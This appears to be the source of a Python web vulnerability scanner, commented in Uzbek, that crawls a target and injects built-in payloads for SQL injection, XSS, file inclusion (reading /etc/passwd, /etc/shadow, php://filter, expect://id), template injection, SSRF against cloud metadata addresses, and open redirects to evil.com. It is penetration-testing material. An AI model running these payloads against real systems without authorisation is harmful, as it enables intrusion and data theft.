"""
WebScanner v2.0
Yaxshilanishlar:
  - SSRF detection (DNS callback simulation)
  - SSTI detection (Jinja2/Twig/Freemarker/Velocity)
  - XSS: kontekst-aware (HTML/attr/JS farqlash)
  - SQLi: false-positive kamaytirish (baseline hash)
  - IDOR: kuchli mantiq (response diff + auth check)
  - Rate limiting + proxy qo'llab-quvvatlash
  - Thread-safe vuln qo'shish + duplicate detection
  - Form POST testing
  - Crawl: JS'dan URL topish
"""

import re
import json
import hashlib
import threading
import time
import urllib.parse
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from rich.console import Console
from rich.table import Table
from .logger import log

console = Console()

# ═══════════════════════════════════════════════════════════════
# PAYLOAD KUTUBXONASI
# ═══════════════════════════════════════════════════════════════

SQLI_PAYLOADS = [
    # Error-based — tez aniqlash
    ("'",                                    "error"),
    ('"',                                    "error"),
    ("'\"",                                  "error"),
    ("\\",                                   "error"),
    ("'||'1'='1",                            "error-oracle"),
    # Auth bypass
    ("' OR '1'='1'--",                       "auth-bypass"),
    ("' OR 1=1--",                           "auth-bypass"),
    ("') OR ('1'='1",                        "auth-bypass"),
    ("admin'--",                             "auth-bypass"),
    # Union — column count probe
    ("' UNION SELECT NULL--",                "union"),
    ("' UNION SELECT NULL,NULL--",           "union"),
    ("' UNION SELECT NULL,NULL,NULL--",      "union"),
    ("1 UNION ALL SELECT NULL,NULL,NULL--",  "union"),
    # Blind time-based (oxirida — sekin)
    ("1' AND SLEEP(4)--",                    "time-mysql"),
    ("1; WAITFOR DELAY '0:0:4'--",          "time-mssql"),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", "time-mysql2"),
    ("1 AND 1=2--",                          "bool-blind"),
]

SQLI_ERRORS = [
    "sql syntax","mysql_fetch","mysql_num_rows","mysql_query",
    "ora-","pg_query","pg_exec","sqlite_","sqlstate",
    "unclosed quotation","odbc","jdbc","syntax error near",
    "warning: mysql","you have an error in your sql",
    "supplied argument is not a valid mysql",
    "quoted string not properly terminated","invalid query",
    "unterminated string literal","microsoft ole db",
    "division by zero","db2 sql error","sybase message",
    "dynamic sql error","sql command not properly ended",
    "column count doesn't match","ambiguous column name",
]

XSS_PAYLOADS = [
    # HTML kontekst
    ('<script>alert("_xss_")</script>',         "html-script"),
    ('<img src=x onerror=alert("_xss_")>',      "html-img"),
    ('<svg onload=alert("_xss_")>',             "html-svg"),
    ('<details open ontoggle=alert("_xss_")>',  "html5"),
    ('<body onload=alert("_xss_")>',            "html-body"),
    ('<iframe src=javascript:alert("_xss_")>',  "html-iframe"),
    # Attribute kontekst
    ('" onmouseover="alert(\'_xss_\')',         "attr-dq"),
    ("' onmouseover='alert(\"_xss_\")",         "attr-sq"),
    ('"><script>alert("_xss_")</script>',       "attr-break"),
    # JS string kontekst
    ('";alert("_xss_");//',                     "js-dq"),
    ("';alert('_xss_');//",                     "js-sq"),
    ("'-alert('_xss_')-'",                      "js-template"),
    # Bypass
    ('<ScRiPt>alert("_xss_")</sCrIpT>',        "case-bypass"),
    ('<scr\x00ipt>alert("_xss_")</scr\x00ipt>',"null-bypass"),
    ('%3Cscript%3Ealert("_xss_")%3C/script%3E',"url-encoded"),
    ('&#60;script&#62;alert("_xss_")&#60;/script&#62;',"html-entity"),
]
XSS_MARKER = "_xss_"

LFI_PAYLOADS = [
    ("../../../etc/passwd",                          "unix-3"),
    ("../../../../etc/passwd",                       "unix-4"),
    ("../../../../../etc/passwd",                    "unix-5"),
    ("../../../../../../etc/passwd",                 "unix-6"),
    ("%2e%2e%2f" * 4 + "etc%2fpasswd",              "url-encoded"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",                 "partial-enc"),
    ("....//....//....//etc/passwd",                 "double-dot"),
    ("/etc/passwd",                                  "absolute"),
    ("/etc/shadow",                                  "shadow"),
    ("/proc/self/environ",                           "proc-environ"),
    ("/var/log/apache2/access.log",                  "log-poison"),
    ("/var/log/nginx/access.log",                    "log-poison-nginx"),
    ("php://filter/convert.base64-encode/resource=index.php", "php-filter"),
    ("php://filter/read=string.rot13/resource=index","php-rot13"),
    ("expect://id",                                  "expect-rce"),
    ("data://text/plain,<?php system('id')?>",       "data-rce"),
    ("../../../windows/system32/drivers/etc/hosts",  "windows"),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","win-backslash"),
]
LFI_INDICATORS = [
    "root:x:0:0:","daemon:","[boot loader]","[extensions]",
    "bin/bash","bin/sh","/usr/sbin/","www-data:",
    "HTTP_USER_AGENT","DOCUMENT_ROOT","SCRIPT_FILENAME",
    "127.0.0.1\tlocalhost",  # /etc/hosts
]

SSTI_PAYLOADS = [
    # Universal probe
    ("{{7*7}}",           "jinja2-twig",   "49"),
    ("${7*7}",            "freemarker",    "49"),
    ("#{7*7}",            "ruby-erb",      "49"),
    ("<%= 7*7 %>",        "ruby-erb2",     "49"),
    ("{{7*'7'}}",         "jinja2",        "7777777"),
    ("${7*'7'}",          "groovy",        "49"),
    # RCE probe (safe — faqat matematik)
    ("{{config}}",        "jinja2-info",   "config"),
    ("%{{7*7}}",          "java-el",       "49"),
    ("*{7*7}",            "spring-spel",   "49"),
    ("@(7*7)",            "razor",         "49"),
]

SSRF_PAYLOADS = [
    # Internal network probe
    ("http://127.0.0.1",           "localhost"),
    ("http://localhost",            "localhost-name"),
    ("http://0.0.0.0",             "null-addr"),
    ("http://[::1]",               "ipv6-loopback"),
    ("http://169.254.169.254/latest/meta-data/", "aws-imds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-meta"),
    ("http://169.254.169.254/metadata/v1/",  "do-meta"),
    ("http://192.168.0.1",         "private-192"),
    ("http://10.0.0.1",            "private-10"),
    ("http://172.16.0.1",          "private-172"),
    # URL bypass
    ("http://127.1",               "short-loopback"),
    ("http://0177.0.0.1",          "octal"),
    ("http://2130706433",          "decimal"),
    ("http://127.0.0.1:22",        "ssh-probe"),
    ("http://127.0.0.1:3306",      "mysql-probe"),
]
SSRF_PARAMS = ["url","uri","path","src","source","dest","destination",
               "redirect","next","return","goto","fetch","load","file",
               "proxy","target","link","image","img","host","site","page"]
SSRF_INDICATORS = [
    "root:","[boot loader]","ami-","instance-id","iam",
    "computeMetadata","droplet","privatekey",
    "SSH-","MySQL","connection refused to",
]

OPEN_REDIRECT_PAYLOADS = [
    ("https://evil.com",             "basic"),
    ("//evil.com",                   "protocol-rel"),
    ("\\\\evil.com",                 "backslash"),
    ("https://evil.com%2F@target",   "at-bypass"),
    ("/\\/evil.com",                 "mixed-slash"),
    ("https:evil.com",               "colon-bypass"),
    ("///evil.com",                  "triple-slash"),
    ("%0dhttps://evil.com",          "cr"),
    ("%0ahttps://evil.com",          "lf"),
    ("javascript://evil.com/%0aalert(1)", "js-proto"),
    ("https://evil。com",             "unicode-dot"),
]
REDIRECT_PARAMS = [
    "url","redirect","next","return","goto","redir","r","to",
    "target","link","back","destination","forward","location",
    "ref","out","path","continue","return_url","redirect_url",
    "success_url","callback","next_url","rurl",
]

SECURITY_HEADERS = [
    ("Strict-Transport-Security", "high",   "HSTS yo'q — MITM/SSL strip xavfi"),
    ("Content-Security-Policy",   "high",   "CSP yo'q — XSS xavfi kuchayadi"),
    ("X-Frame-Options",           "medium", "Clickjacking xavfi"),
    ("X-Content-Type-Options",    "low",    "MIME sniffing xavfi"),
    ("Referrer-Policy",           "low",    "Referer orqali ma'lumot sizishi"),
    ("Permissions-Policy",        "low",    "Permissions-Policy sozlanmagan"),
    ("Cross-Origin-Opener-Policy","low",    "COOP yo'q"),
]

INFO_HEADERS = [
    "X-Powered-By","Server","X-AspNet-Version","X-AspNetMvc-Version",
    "X-Generator","X-Drupal-Cache","X-Varnish","Via",
]

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "https://attacker.com",
    "https://evil.{domain}",   # subdomain
    "https://{domain}.evil.com", # suffix bypass
]

IDOR_PARAMS = [
    "id","user_id","uid","account","profile","order","doc","file",
    "item","record","pid","cid","key","invoice","ticket","customer",
    "member","num","email","username","ref","token","hash",
]


# ═══════════════════════════════════════════════════════════════
# WEB SCANNER
# ═══════════════════════════════════════════════════════════════

class WebScanner:
    def __init__(self, args):
        self.target     = args.url.rstrip("/")
        self.args       = args
        self.timeout    = getattr(args, "timeout", 10)
        self.rate_limit = getattr(args, "rate_limit", 0)
        self.lock       = threading.Lock()
        self._seen_vulns= set()  # duplicate kamaytirish

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept"    : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })

        if getattr(args, "cookie", None):
            self.session.headers["Cookie"] = args.cookie
        for h in getattr(args, "header", []):
            if ":" in h:
                k, v = h.split(":", 1)
                self.session.headers[k.strip()] = v.strip()
        if getattr(args, "proxy", None):
            self.session.proxies = {"http": args.proxy, "https": args.proxy}

        self.results = {
            "target"        : self.target,
            "timestamp"     : datetime.now().isoformat(),
            "vulnerabilities": [],
            "info"          : [],
            "crawled_urls"  : [],
        }
        self.urls_to_test = set()
        self.baselines    = {}   # url_path -> (status, len, hash) baseline

    # ── Public ─────────────────────────────────────────────────

    def run(self):
        log.info(f"Web skan: [cyan]{self.target}[/cyan]")
        run_all = getattr(self.args, "all", False)

        if run_all or getattr(self.args, "crawl", False):
            self._crawl()
        else:
            self.urls_to_test.add(self.target)

        if run_all or getattr(self.args, "headers", False):
            self._check_headers()
        if run_all or getattr(self.args, "cors", False):
            self._check_cors()

        param_urls = [u for u in self.urls_to_test if "?" in u]
        console.print(f"  [dim]Parametrli URL: {len(param_urls)} ta[/dim]")

        if run_all or getattr(self.args, "sqli", False):
            self._scan_sqli(param_urls)
        if run_all or getattr(self.args, "xss", False):
            self._scan_xss(param_urls)
        if run_all or getattr(self.args, "lfi", False):
            self._scan_lfi(param_urls)
        if run_all or getattr(self.args, "ssti", False):
            self._scan_ssti(param_urls)
        if run_all or getattr(self.args, "ssrf", False):
            self._scan_ssrf(param_urls)
        if run_all or getattr(self.args, "redirect", False):
            self._scan_redirect(param_urls)
        if run_all or getattr(self.args, "idor", False):
            self._scan_idor(param_urls)

        self._print_summary()
        return self.results

    def save_results(self, results, output_file):
        fname = output_file if output_file.endswith(".json") else output_file + "_scan.json"
        with open(fname, "w") as f:
            json.dump(results, f, indent=2, default=str)
        log.success(f"Scan natija saqlandi: {fname}")

    # ── Helpers ────────────────────────────────────────────────

    def _get(self, url, **kwargs):
        if self.rate_limit:
            time.sleep(self.rate_limit)
        try:
            return self.session.get(url, timeout=self.timeout, **kwargs)
        except Exception:
            return None

    def _inject(self, url, param, value):
        """URL parametrini xavfsiz almashtirish."""
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        qs[param] = [value]
        return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True)))

    def _add_vuln(self, severity, vuln_type, url, param, payload,
                  evidence, description, remediation):
        key = f"{vuln_type}|{url}|{param}"
        with self.lock:
            if key in self._seen_vulns:
                return
            self._seen_vulns.add(key)
            self.results["vulnerabilities"].append({
                "severity"   : severity,
                "type"       : vuln_type,
                "url"        : url,
                "parameter"  : param,
                "payload"    : str(payload)[:200],
                "evidence"   : str(evidence)[:300],
                "description": description,
                "remediation": remediation,
            })
        log.vuln(severity, f"{vuln_type} — {url[:70]} (param: {param})")

    def _add_info(self, msg):
        with self.lock:
            self.results["info"].append(msg)
        log.debug(msg)

    def _baseline(self, url):
        """URL uchun baseline response olish."""
        r = self._get(url, allow_redirects=True)
        if not r:
            return None
        key = urllib.parse.urlparse(url).path
        self.baselines[key] = {
            "status": r.status_code,
            "length": len(r.text),
            "hash"  : hashlib.md5(r.text.encode()).hexdigest(),
        }
        return r

    def _is_baseline(self, url, r):
        """Response baseline'dan farq qiladimi?"""
        key = urllib.parse.urlparse(url).path
        if key not in self.baselines:
            return False
        b = self.baselines[key]
        if b["hash"] == hashlib.md5(r.text.encode()).hexdigest():
            return True  # Bir xil — ehtimol false positive
        return False

    # ── Crawl ──────────────────────────────────────────────────

    def _crawl(self):
        depth = getattr(self.args, "depth", 3)
        log.info(f"Crawling boshlandi (chuqurlik: {depth})...")
        visited = set()
        queue   = [self.target]
        base    = urllib.parse.urlparse(self.target).netloc

        for _ in range(depth):
            nxt = []
            for url in queue:
                if url in visited or len(visited) > 300:
                    continue
                visited.add(url)
                r = self._get(url, allow_redirects=True)
                if not r:
                    continue

                self.urls_to_test.add(url)
                self._baseline(url)

                soup = BeautifulSoup(r.text, "html.parser")

                # Linklar
                for tag in soup.find_all(["a","link"], href=True):
                    href = tag["href"]
                    if href.startswith(("javascript:","mailto:","tel:","#")):
                        continue
                    full = urllib.parse.urljoin(url, href)
                    if urllib.parse.urlparse(full).netloc == base and full not in visited:
                        nxt.append(full)
                        self.urls_to_test.add(full)

                # Formlar
                for form in soup.find_all("form"):
                    action = urllib.parse.urljoin(url, form.get("action") or url)
                    method = form.get("method","get").lower()
                    params = []
                    for inp in form.find_all(["input","textarea","select"]):
                        name = inp.get("name")
                        val  = inp.get("value","test")
                        if name:
                            params.append(f"{urllib.parse.quote(name)}={urllib.parse.quote(str(val))}")
                    if params:
                        sep = "?" if "?" not in action else "&"
                        form_url = action + sep + "&".join(params)
                        self.urls_to_test.add(form_url)

                # JS'dan URL'lar
                for sc in soup.find_all("script", src=True):
                    src = urllib.parse.urljoin(url, sc["src"])
                    if urllib.parse.urlparse(src).netloc == base:
                        js = self._get(src)
                        if js:
                            for ju in re.findall(r'["\']([/][a-zA-Z0-9_/.\-?=&%]+)["\']', js.text):
                                full_ju = urllib.parse.urljoin(self.target, ju)
                                self.urls_to_test.add(full_ju)

                # API endpointlar (fetch/axios'dan)
                for ju in re.findall(r'(?:fetch|axios\.(?:get|post))\s*\(\s*["\']([^"\']+)["\']', r.text):
                    full_ju = urllib.parse.urljoin(self.target, ju)
                    self.urls_to_test.add(full_ju)

            queue = nxt

        self.results["crawled_urls"] = list(self.urls_to_test)
        log.success(f"Crawl: {len(self.urls_to_test)} ta URL topildi")

    # ── Security Headers ───────────────────────────────────────

    def _check_headers(self):
        log.info("Security Headers auditi...")
        r = self._get(self.target)
        if not r:
            return

        for header, sev, desc in SECURITY_HEADERS:
            if header.lower() not in {h.lower() for h in r.headers}:
                self._add_vuln(sev, f"Missing: {header}", self.target,
                               "HTTP Header", header, "",
                               desc, f"Response headeriga '{header}' qo'shing.")

        for header in INFO_HEADERS:
            val = r.headers.get(header)
            if val:
                self._add_info(f"Info header: {header}: {val}")
                self._add_vuln("info", f"Info Disclosure: {header}", self.target,
                               "HTTP Header", header, val,
                               f"{header} texnologiya ma'lumotini oshkor qilmoqda.",
                               f"{header} headerini o'chiring yoki bo'shatib qo'ying.")

        # Cookie flags
        for ck_header in r.headers.get_list("Set-Cookie") if hasattr(r.headers,"get_list") else [r.headers.get("Set-Cookie","")]:
            if ck_header:
                if "httponly" not in ck_header.lower():
                    self._add_vuln("medium","Cookie: HttpOnly yo'q", self.target,
                                   "Cookie","Set-Cookie", ck_header[:80],
                                   "Cookie HttpOnly flagi yo'q — JS orqali o'qilishi mumkin.",
                                   "Cookie'ga HttpOnly flag qo'shing.")
                if "secure" not in ck_header.lower():
                    self._add_vuln("low","Cookie: Secure yo'q", self.target,
                                   "Cookie","Set-Cookie", ck_header[:80],
                                   "Cookie Secure flagi yo'q — HTTP orqali uzatilishi mumkin.",
                                   "Cookie'ga Secure flag qo'shing.")
                if "samesite" not in ck_header.lower():
                    self._add_vuln("low","Cookie: SameSite yo'q", self.target,
                                   "Cookie","Set-Cookie", ck_header[:80],
                                   "SameSite yo'q — CSRF xavfi.",
                                   "Cookie'ga SameSite=Strict yoki Lax qo'shing.")

    # ── CORS ───────────────────────────────────────────────────

    def _check_cors(self):
        log.info("CORS tekshirilmoqda...")
        domain = urllib.parse.urlparse(self.target).netloc

        for origin_tpl in CORS_ORIGINS:
            origin = origin_tpl.format(domain=domain)
            r = self._get(self.target, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","").lower()

            if acao == "*":
                self._add_vuln("medium","CORS: Wildcard Origin", self.target,
                               "Origin","*", f"ACAO: *",
                               "Har qanday origin so'rovlariga javob qaytarmoqda.",
                               "CORS whitelist'ini faqat ishonchli originlarga cheklang.")
                break
            if acao == origin and "evil" in origin:
                sev = "high" if acac == "true" else "medium"
                self._add_vuln(sev,"CORS: Arbitrary Origin Reflected", self.target,
                               "Origin", origin,
                               f"ACAO: {acao} | ACAC: {acac}",
                               "Attacker origin'i qabul qilinmoqda" + (" + credentials!" if acac=="true" else "."),
                               "Origin'ni server tomonida whitelist bilan tekshiring.")
                break

    # ── SQL Injection ──────────────────────────────────────────

    def _scan_sqli(self, urls):
        log.info(f"SQL Injection — {len(urls)} URL...")
        if not urls:
            log.debug("Parametrli URL yo'q, o'tkazib yuborildi")
            return

        def test(url):
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            # Baseline
            b = self._get(url)
            b_text = b.text.lower() if b else ""
            b_len  = len(b_text)

            for param in params:
                for payload, ptype in SQLI_PAYLOADS:
                    injected = self._inject(url, param, payload)

                    if "SLEEP" in payload or "WAITFOR" in payload:
                        # Time-based: faqat vaqt o'lchash
                        t0 = time.time()
                        r  = self._get(injected)
                        elapsed = time.time() - t0
                        if elapsed >= 3.5:
                            self._add_vuln(
                                "critical","SQL Injection (Time-Based Blind)",
                                url, param, payload,
                                f"Response: {elapsed:.1f}s (expected ~4s)",
                                f"'{param}' parametrida time-based blind SQLi — server uyquga ketdi.",
                                "Prepared statement ishlating. User inputini hech qachon SQL'ga to'g'ri qo'shmang."
                            )
                            return  # Bu param uchun bas
                    else:
                        r = self._get(injected)
                        if not r:
                            continue
                        body = r.text.lower()

                        # Error topildi
                        found_err = next((e for e in SQLI_ERRORS if e in body), None)
                        if found_err:
                            # False positive: baseline'da ham shu xato bormi?
                            if found_err not in b_text:
                                self._add_vuln(
                                    "critical","SQL Injection (Error-Based)",
                                    url, param, payload,
                                    f"DB error: '{found_err}'",
                                    f"'{param}' parametrida error-based SQLi topildi ({ptype}).",
                                    "Prepared statement ishlating."
                                )
                                return

                        # Boolean blind: response farqi
                        if ptype == "bool-blind" and abs(len(body) - b_len) > 50:
                            self._add_vuln(
                                "high","SQL Injection (Boolean Blind — possible)",
                                url, param, payload,
                                f"Response farqi: {abs(len(body)-b_len)} bayt",
                                f"'{param}' parametrida boolean blind SQLi ehtimoli.",
                                "Prepared statement ishlating."
                            )
                            return

        threads = getattr(self.args, "threads", 10)
        with ThreadPoolExecutor(max_workers=threads) as exe:
            list(exe.map(test, urls[:80]))

    # ── XSS ───────────────────────────────────────────────────

    def _scan_xss(self, urls):
        log.info(f"XSS — {len(urls)} URL...")
        if not urls:
            return

        def test(url):
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            for param in params:
                for payload_tpl, ptype in XSS_PAYLOADS:
                    uid  = ''.join(random.choices("abcdef0123456789", k=6))
                    payload = payload_tpl.replace(XSS_MARKER, f"xss_{uid}")
                    marker  = f"xss_{uid}"

                    injected = self._inject(url, param, payload)
                    r = self._get(injected)
                    if not r:
                        continue

                    body = r.text

                    # Kontekst-aware: marker raw (decoded) holida bormi?
                    raw_reflected   = marker in body
                    # HTML-encoded?
                    enc_reflected   = (marker in body.replace("&lt;","<")
                                                     .replace("&gt;",">")
                                                     .replace("&amp;","&")
                                                     .replace("&#34;",'"')
                                                     .replace("&#39;","'"))

                    if raw_reflected:
                        # Kontekst aniqlash
                        ctx = self._xss_context(body, marker)
                        self._add_vuln(
                            "high","XSS (Reflected)",
                            url, param, payload,
                            f"Payload raw holda aks etdi. Kontekst: {ctx} ({ptype})",
                            f"'{param}' parametrida reflected XSS topildi.",
                            "Barcha user inputlarini output kontekstiga mos encode qiling. CSP header qo'shing."
                        )
                        return
                    elif enc_reflected:
                        self._add_vuln(
                            "low","XSS (Reflected, Encoded — DOM bypass mumkin)",
                            url, param, payload,
                            f"Payload HTML-encoded holda aks etdi ({ptype})",
                            f"'{param}' parametrida XSS payload encode qilib aks etdi. DOM sink bo'lsa exploit mumkin.",
                            "Server-side encoding yetarli, DOM-based XSS ham tekshiring."
                        )

        threads = getattr(self.args, "threads", 10)
        with ThreadPoolExecutor(max_workers=threads) as exe:
            list(exe.map(test, urls[:80]))

    def _xss_context(self, body, marker):
        """Marker qaysi kontekstda ekanini aniqlash."""
        idx = body.find(marker)
        if idx < 0:
            return "unknown"
        snippet = body[max(0,idx-80):idx+80]
        if re.search(r'<script[^>]*>', snippet, re.I):
            return "JS"
        if re.search(r'<[^>]+=["\']?[^"\']*' + re.escape(marker), snippet, re.I):
            return "HTML-attribute"
        if re.search(r'<!--.*' + re.escape(marker), snippet, re.I):
            return "HTML-comment"
        return "HTML"

    # ── LFI ───────────────────────────────────────────────────

    def _scan_lfi(self, urls):
        log.info(f"LFI / Path Traversal — {len(urls)} URL...")
        if not urls:
            return

        def test(url):
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            # File-related parametrlarga ustunlik
            file_params = [p for p in params if any(kw in p.lower() for kw in
                           ["file","path","page","include","doc","template","view","load","read"])]
            all_params  = file_params + [p for p in params if p not in file_params]

            for param in all_params:
                for payload, ptype in LFI_PAYLOADS:
                    injected = self._inject(url, param, payload)
                    r = self._get(injected)
                    if not r:
                        continue
                    found = next((ind for ind in LFI_INDICATORS if ind in r.text), None)
                    if found:
                        self._add_vuln(
                            "critical","LFI (Local File Inclusion)",
                            url, param, payload,
                            f"Indicator: '{found}'",
                            f"'{param}' parametrida LFI topildi — server fayllari o'qilmoqda ({ptype}).",
                            "Foydalanuvchi inputini fayl yo'lida hech qachon ishlatmang. Whitelist + realpath() ishlating."
                        )
                        return

        threads = getattr(self.args, "threads", 10)
        with ThreadPoolExecutor(max_workers=threads) as exe:
            list(exe.map(test, urls[:60]))

    # ── SSTI ──────────────────────────────────────────────────

    def _scan_ssti(self, urls):
        log.info(f"SSTI (Template Injection) — {len(urls)} URL...")
        if not urls:
            return

        def test(url):
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                for payload, engine, expected in SSTI_PAYLOADS:
                    injected = self._inject(url, param, payload)
                    r = self._get(injected)
                    if not r:
                        continue
                    if expected in r.text and payload not in r.text.replace(expected,""):
                        # Payload bajarildi (49 chiqdi, lekin "{{7*7}}" yo'q)
                        self._add_vuln(
                            "critical","SSTI (Server-Side Template Injection)",
                            url, param, payload,
                            f"Natija: '{expected}' topildi (engine: {engine})",
                            f"'{param}' parametrida SSTI topildi — template engine kodi bajarmoqda! RCE mumkin.",
                            "Foydalanuvchi inputini template'ga hech qachon to'g'ri qo'shmang. Sandboxed rendering ishlating."
                        )
                        return

        threads = getattr(self.args, "threads", 10)
        with ThreadPoolExecutor(max_workers=threads) as exe:
            list(exe.map(test, urls[:60]))

    # ── SSRF ──────────────────────────────────────────────────

    def _scan_ssrf(self, urls):
        log.info(f"SSRF — {len(urls)} URL...")
        if not urls:
            return

        for url in list(self.urls_to_test)[:50]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            ssrf_params = [p for p in params if p.lower() in SSRF_PARAMS]
            if not ssrf_params:
                continue

            for param in ssrf_params:
                for payload, ptype in SSRF_PAYLOADS:
                    injected = self._inject(url, param, payload)
                    r = self._get(injected)
                    if not r:
                        continue
                    body = r.text

                    found = next((ind for ind in SSRF_INDICATORS if ind in body), None)
                    if found:
                        self._add_vuln(
                            "critical","SSRF (Server-Side Request Forgery)",
                            url, param, payload,
                            f"Indicator: '{found}'",
                            f"'{param}' parametrida SSRF topildi — server ichki so'rov yubormoqda ({ptype}).",
                            "URL parametrlarini whitelist bilan tekshiring. Ichki manzillarga so'rovni bloklang."
                        )
                        break

                    # Xato kodi ham ssrf belgisi bo'lishi mumkin
                    if r.status_code in [200,500] and any(x in body.lower() for x in
                                                          ["connection refused","connection reset","no route"]):
                        self._add_vuln(
                            "medium","SSRF (Possible — Error Response)",
                            url, param, payload,
                            f"Status {r.status_code}, connection error javob",
                            f"'{param}' SSRF belgilari ko'rsatmoqda (ichki xato). Qo'lda tekshiring.",
                            "URL parametrlarini whitelist bilan cheklang."
                        )
                        break

    # ── Open Redirect ──────────────────────────────────────────

    def _scan_redirect(self, urls):
        log.info(f"Open Redirect — {len(urls)} URL...")

        for url in urls[:60]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            redir_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
            if not redir_params:
                continue

            for param in redir_params:
                for payload, ptype in OPEN_REDIRECT_PAYLOADS:
                    injected = self._inject(url, param, payload)
                    r = self._get(injected, allow_redirects=False)
                    if not r:
                        continue
                    loc = r.headers.get("Location","")
                    if "evil.com" in loc or "attacker.com" in loc:
                        self._add_vuln(
                            "medium","Open Redirect",
                            url, param, payload,
                            f"Location: {loc}",
                            f"'{param}' parametrida open redirect — foydalanuvchi attacker saytiga yuborilmoqda ({ptype}).",
                            "Redirect URLlarini server tomonida whitelist bilan tekshiring."
                        )
                        break

    # ── IDOR ──────────────────────────────────────────────────

    def _scan_idor(self, urls):
        log.info(f"IDOR — {len(urls)} URL...")

        for url in urls[:50]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            id_params = [p for p in params if p.lower() in IDOR_PARAMS]
            if not id_params:
                continue

            for param in id_params:
                orig_val = params[param][0]
                if not orig_val.isdigit():
                    continue

                # Baseline olish
                base_r = self._get(url)
                if not base_r or base_r.status_code not in [200, 201]:
                    continue
                base_len = len(base_r.text)
                base_hash= hashlib.md5(base_r.text.encode()).hexdigest()

                accessed = []
                for test_id in ["1","2","3","99","100","999","1000"]:
                    if test_id == orig_val:
                        continue
                    test_url = self._inject(url, param, test_id)
                    r = self._get(test_url)
                    if not r:
                        continue
                    if r.status_code == 200:
                        r_hash = hashlib.md5(r.text.encode()).hexdigest()
                        diff   = abs(len(r.text) - base_len)
                        # Bir xil content → boshqa ID ham xuddi shunday → IDOR
                        if r_hash != base_hash and diff < 200 and len(r.text) > 200:
                            accessed.append(test_id)

                if len(accessed) >= 2:
                    self._add_vuln(
                        "high","IDOR (Insecure Direct Object Reference)",
                        url, param, f"ID={accessed[0]}",
                        f"ID'lar {accessed[:3]} ham 200 qaytardi, response o'zgargan",
                        f"'{param}' parametrida IDOR — boshqa foydalanuvchi ma'lumotlari ko'rinmoqda. Autorizatsiya tekshirilmayapti.",
                        "Har bir so'rovda server tomonida foydalanuvchi huquqlarini tekshiring."
                    )

    # ── Summary ────────────────────────────────────────────────

    def _print_summary(self):
        vulns = self.results["vulnerabilities"]
        console.print("\n" + "─" * 65)

        order  = ["critical","high","medium","low","info"]
        colors = {"critical":"bold red","high":"red","medium":"yellow","low":"blue","info":"dim"}
        counts = {s: sum(1 for v in vulns if v["severity"]==s) for s in order}

        t = Table(title=f"Scan Natijasi: {self.target}", header_style="bold cyan")
        t.add_column("Jiddiylik", style="bold")
        t.add_column("Soni", justify="right")
        t.add_column("Zaiflik turlari")

        for sev in order:
            n = counts[sev]
            if n:
                types = list({v["type"] for v in vulns if v["severity"]==sev})
                t.add_row(f"[{colors[sev]}]{sev.upper()}[/{colors[sev]}]",
                          str(n), ", ".join(types))

        if not vulns:
            t.add_row("[green]CLEAN[/green]","0","Zaiflik topilmadi ✓")

        console.print(t)

        if vulns:
            console.print("\n[bold]Batafsil:[/bold]")
            for i, v in enumerate(vulns, 1):
                c = colors.get(v["severity"],"white")
                console.print(f"  {i}. [{c}][{v['severity'].upper()}][/{c}] {v['type']}")
                console.print(f"     URL  : [cyan]{v['url'][:80]}[/cyan]")
                console.print(f"     Param: {v['parameter']}  Payload: [dim]{v['payload'][:50]}[/dim]")
                console.print(f"     Fix  : [green]{v['remediation']}[/green]\n")
